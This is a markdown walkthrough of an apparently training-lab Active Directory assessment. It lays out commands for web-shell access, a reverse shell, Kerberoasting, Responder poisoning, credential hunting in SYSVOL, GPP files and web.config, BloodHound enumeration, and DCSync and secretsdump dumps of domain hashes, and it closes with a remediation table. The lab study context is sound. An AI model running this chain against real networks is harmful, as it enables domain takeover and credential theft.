# Active Directory Comprehensive Skills Assessment - Complete Path Documentation

## 🎯 Core Concepts

This documentation outlines the complete operational methodology for compromising dual Active Directory lab environments. 
- **Part I**: Focuses on initial foothold via web shell, local escalation to `SYSTEM`, active Kerberoasting, ACL abuse, and Domain Controller takeover.
- **Part II**: Focuses on Linux-based external network discovery, pre-authentication enumeration, LLMNR/NBT-NS poisoning, credential harvesting across system files, and full domain takeover via DCSync.

---

## 🔄 Complete Assessment Flow

┌─────────────────────────────────────────────────────────────────┐
│                    PART I (Windows Path)                         │
├─────────────────────────────────────────────────────────────────┤
│ Antak Web Shell → Reverse Shell → SYSTEM on WEB-WIN01           │
│         ↓                                                       │
│ Enumerate AD (Users, Groups, SPNs)                              │
│         ↓                                                       │
│ Kerberoast → Crack Password → Move to MS01                      │
│         ↓                                                       │
│ Find Cleartext Credentials → ACL Abuse → DCSync → DC01          │
└─────────────────────────────────────────────────────────────────┘
↓
┌─────────────────────────────────────────────────────────────────┐
│                    PART II (Linux Path)                         │
├─────────────────────────────────────────────────────────────────┤
│ Linux Attack Host → Enumerate Network → Find DC01               │
│         ↓                                                       │
│ Kerbrute + Responder → Capture Hash → Crack → Foothold          │
│         ↓                                                       │
│ Evil-WinRM to MS01 → Enumerate Domain                           │
│         ↓                                                       │
│ Find Weak Credentials → GPP/SYSVOL/Web.config                   │
│         ↓                                                       │
│ Move to SQL01 → Get Flag                                        │
│         ↓                                                       │
│ Find GenericAll User → ACL Abuse → Domain Admin                 │
│         ↓                                                       │
│ DCSync → KRBTGT Hash → All Flags                                │
└─────────────────────────────────────────────────────────────────┘


---

## 🛠️ Part I: Windows-Centric Initial Foothold & AD Compromise

### 1. Initial Access & Shell Escalation
* **Access Antak Web Shell:** Navigate to `http://10.129.52.102/uploads/antak.aspx` using credentials `admin` : `My_W3bsH3ll_P@ssw0rd!`.
* **Establish Reverse Shell:** Transfer and execute a PowerShell reverse shell payload pointing to the Kali listener on port `443`.
* **Privilege & System Verification:** Validate host context on `WEB-WIN01` (`172.16.6.3`) operating under `NT AUTHORITY\SYSTEM`.

### 2. Domain Enumeration & Kerberoasting
* **SPN Account Enumeration:** Load `PowerView.ps1` to query accounts with registered Service Principal Names.

    Import-Module .\PowerView.ps1
    Get-DomainUser -SPN | Select-Object SamAccountName, ServicePrincipalName

* **Request & Extract TGS Tickets:** Use Rubeus or PowerView to request Kerberos service tickets for identified SPN accounts.

    .\Rubeus.exe kerberoast /stats
    .\Rubeus.exe kerberoast /outfile:hashes.txt

* **Offline Password Cracking:** Crack extracted hashes offline with Hashcat mode `13100` (`krb5tgs`).

    hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

### 3. Lateral Movement & Domain Takeover
* **Pivot to Host MS01:** Authenticate to `MS01` using cracked service account credentials.
* **Identify ACL Abuse Paths:** Query misconfigured ACL permissions (`GenericAll`, `WriteDACL`, `GenericWrite`) assigned to controlled accounts.

    $sid = Convert-NameToSid <UserAccount>
    Get-DomainObjectAcl -ResolveGUIDs -Identity * | Where-Object {$_.SecurityIdentifier -eq $sid}

* **DCSync & DC01 Compromise:** Verify replication rights (`DS-Replication-Get-Changes`) and execute a DCSync attack via Mimikatz to extract the `krbtgt` hash.

    lsadump::dcsync /domain:inlanefreight.local /user:krbtgt

---

## 🛠️ Part II: Linux-Centric Assessment & Network Exploitation

### 1. Network Discovery & User Enumeration
* **SSH to Attack Host:** Connect to `10.129.54.36` using `htb-student` : `HTB_@cademy_stdnt!`.
* **Subnet & DC Discovery:** Identify live infrastructure within `172.16.7.240/23` (`DC01`: `172.16.7.3`, `MS01`: `172.16.7.50`, `SQL01`: `172.16.7.60`).
* **Active User Enumeration:** Run Kerbrute to identify valid domain users and AS-REP Roastable accounts.

    kerbrute userenum -d inlanefreight.local --dc 172.16.7.3 /opt/jsmith.txt

### 2. Poisoning, Hash Harvesting & Initial Access
* **LLMNR/NBT-NS Poisoning:** Run Responder on the local network interface to capture inbound NTLMv2 authentication hashes.

    sudo responder -I eth0 -dwv

* **Hash Cracking & Foothold:** Crack captured NTLMv2 hashes with Hashcat mode `5600`. Authenticate to `MS01` via `evil-winrm`.

    hashcat -m 5600 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
    evil-winrm -i 172.16.7.50 -u AB920 -p weasal

### 3. Credential Harvesting & Multi-Host Pivoting
Search configuration files, local drives, SYSVOL, and Active Directory object attributes for cleartext credentials:

| Location | Targeted File / Attribute | Command / Methodology |
| :--- | :--- | :--- |
| **SYSVOL Scripts** | `.bat`, `.vbs`, `.ps1` | `Get-ChildItem -Path \\inlanefreight.local\sysvol\ -Recurse -Include *.ps1,*.bat` |
| **GPP Files** | `Groups.xml`, `cpassword` | `Get-GPPPassword` or `gpp-decrypt` |
| **Web Configurations** | `web.config` | `Select-String -Path C:\inetpub\wwwroot\web.config -Pattern "connectionString"` |
| **AD Descriptions** | Account `description` field | `Get-DomainUser \| Where-Object {$_.description -ne $null}` |

* **MSSQL Pivot to SQL01:** Use discovered database credentials to connect to `SQL01` using Impacket's `mssqlclient.py`.

    mssqlclient.py INLANEFREIGHT.LOCAL/dbuser@172.16.7.60 -windows-auth

### 4. Graph Analysis & Final Domain Compromise
* **Bloodhound Ingestion:** Run `bloodhound-python` to gather domain graph data and identify the shortest attack paths to `Domain Admin`.

    bloodhound-python -d inlanefreight.local -dc DC01.inlanefreight.local -c All -u AB920 -p weasal

* **ACL Abuse & Privilege Escalation:** Leverage `GenericAll` rights over a target user to reset credentials or grant DCSync replication permissions.
* **Full Domain Secrets Dump:** Execute `secretsdump.py` against `DC01` to dump all domain NTLM hashes, including `krbtgt` and `Administrator`.

    secretsdump.py inlanefreight.local/PrivUser:'Password123'@172.16.7.3 -just-dc

---

## 📋 Comprehensive Attack Matrix & Artifact Checklist

| Attack Vector | Trigger / Prerequisite | Key Tooling | Defensive Remediation |
| :--- | :--- | :--- | :--- |
| **AS-REP Roasting** | Accounts lacking Kerberos Pre-Authentication | Kerbrute, Rubeus, Hashcat | Enforce Kerberos Pre-Authentication on all accounts. |
| **Kerberoasting** | Service accounts with configured SPNs | PowerView, GetUserSPNs.py, Hashcat | Migrate to gMSAs; set 25+ character passwords for legacy service accounts. |
| **LLMNR/NBT-NS Poisoning** | Unicast/Multicast name resolution requests | Responder, Hashcat | Disable LLMNR and NBT-NS via Group Policy; enforce SMB Signing. |
| **ACL Abuse** | Permissive object rights (`GenericAll`, `WriteDACL`) | PowerView, BloodHound | Audit AD ACLs regularly; adhere to strict least-privilege delegation. |
| **DCSync** | `DS-Replication-Get-Changes` rights assigned to non-DC | Mimikatz, secretsdump.py | Restrict Directory Replication permissions exclusively to Domain Controllers. |
